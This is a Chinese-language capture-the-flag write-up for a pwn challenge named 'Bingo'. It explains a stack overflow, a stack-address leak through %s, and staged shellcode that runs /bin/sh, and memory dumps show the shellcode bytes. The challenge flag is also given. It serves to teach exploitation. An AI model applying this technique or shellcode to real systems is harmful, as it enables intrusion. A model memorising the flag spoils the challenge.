# Bingo

```
Arch:     amd64-64-little 
RELRO:    Partial RELRO   
Stack:    No canary found 
NX:       NX disabled     
PIE:      PIE enabled     
RWX:      Has RWX segments
```

## Analysis

這題顧名思義在玩 bingo。我們要輸入 16 個數字，一旦對其中 8 個就算贏，並且可以再輸入一些東西，這個地方有 overflow 的漏洞。  
因為產生答案用的亂數種子是 0，所以那 16 個數字會是已知且固定的。
但是這題有開 `PIE`，沒辦法直接造 ROP 出來。不過 `DEP` 是關掉的，所以可以想辦法寫 shellcode 來跑。

```c
// 這題的 input function

for ( i = 0; ; ++i )
{
    result = (unsigned int)i;
    if ( i >= (signed int)len )
        break;
    read(0, &buf[i], 1uLL);
    if ( buf[i] == '\n' )
        buf[i] = 0;
    result = (unsigned __int8)buf[i];
    if ( !(_BYTE)result )
        break;
}
return result;
```

我原本是想利用 null byte overflow 來做事，不過發現資訊真的太少，沒頭緒了好一陣子才終於想到應該先去看哪邊可以 leak 東西XD

## Exploit

程式是用 `%s` 來印我們輸入的數字，所以如果輸入第 16 個數字時補滿 4byte，就可以 leak 出後面的 stack address (下圖**粗體**部分)。

<pre>
                            --------------------------------------------
0x7ffe88be2720: num_buf -> | 0x00007f85b0f50620      0x00000010e45e0ef8 |
0x7ffe88be2730:            | 0x0000363800333831      0x0035313100373731 |
0x7ffe88be2740:            | 0x0035333100333931      0x0000323900363831 |
0x7ffe88be2750:            | 0x0000313200003934      0x0000373200323631 |
0x7ffe88be2760:            | 0x00003935e4003039      0x9039393100333631 |
                            --------------------------------------------
0x7ffe88be2770:              <b>0x00007ffe88be2780</b>      0x0000558ae45e0e49 <- playBingo() 的 ret address
0x7ffe88be2780:              0x0000558ae45e0e50      0x00007f85b0bab830
</pre>

有了 stack address 之後，就可以在 stack 上寫 shellcode，然後 return 過去跑。  
不過因為入長度不太夠，前面輸入數字那邊又有很多檢查，不能把 shellcode 直接寫在那邊。這裡我事先寫一段呼叫 `read` 的 shellcode (下圖**粗體**部分)，把最後的 shellcode (下圖++底線++部分) 讀上 stack，中間斷層的部分就用 `nop` 填補。

<pre>
0x7ffe88be2720:              0x00007f85b0f50620      0x00000010e45e0ef8
0x7ffe88be2730:              0x0000363800333831      0x0035313100373731
0x7ffe88be2740:              0x0035333100333931      0x0000323900363831
0x7ffe88be2750:              0x0000313200003934      0x0000373200323631
0x7ffe88be2760:              0x00003935e4003039      0x<b>48da894c</b>00333631
0x7ffe88be2770:              0x909090<b>050f06ee83</b>      0x<u>490000003bc0c748</u>
0x7ffe88be2780:              0x<u>68732f6e69622fb8</u>      0x<u>3148e78948504100</u>
0x7ffe88be2790:              0x0000<u>050fd23148f6</u>      0x00007ffe88be2868
</pre>

這樣一路滑下去之後就可以開 shell 了！

flag: `FLAG{THIS_challenge_is_too_easy_QQ}`
